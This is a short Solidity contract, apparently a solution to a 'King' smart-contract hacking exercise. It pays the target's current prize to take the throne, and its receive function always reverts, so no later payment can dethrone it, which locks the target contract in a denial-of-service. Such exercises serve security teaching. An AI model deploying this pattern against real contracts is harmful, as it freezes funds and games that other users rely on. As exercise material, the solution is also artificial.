// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        uint256 prize=King(payable(contractAddress)).prize();
        contractAddress.call{value:prize}("");
    }
receive() external payable {

    require(1>11);
}
}
